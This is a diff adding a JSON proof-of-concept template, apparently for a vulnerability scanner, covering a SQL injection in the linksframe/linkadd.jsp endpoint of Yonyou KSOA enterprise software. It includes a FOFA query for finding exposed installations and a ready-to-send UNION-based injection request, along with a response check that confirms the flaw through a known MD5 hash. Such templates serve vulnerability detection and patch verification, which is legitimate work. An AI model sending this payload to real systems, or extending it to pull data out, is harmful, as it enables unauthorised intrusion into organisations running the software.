@@ -1,0 +1,36 @@
+{
+  "product": "用友时空KSOA",
+  "vul_name": "用友时空KSOA linksframe/linkadd.jsp接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友时空KSOA是一款专业的企业应用集成平台，可整合企业各种信息系统和业务系统，帮助企业快速了解业务状态和动态。 通过用友时空KSOA，企业可以通过自定义关键业务指标，实时监控各系统和业务状态，并通过分析工具优化业务管理和决策支持模式。 功能： 包括应用整合、业务集成、数据共享、流程自动化等。 价值： 用友时空KSOA可以帮助企业提升业务管理效率，快速响应客户需求，防范风险，提高决策质量和企业竞争力。用友时空KSOA linksframe/linkadd.jsp接口存在SQL注入漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-时空KSOA\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/koY5vqp6DeL3sFRan0eEWA",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/linksframe/linkadd.jsp?id=666666' union all select null,null,sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),null,null,'"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
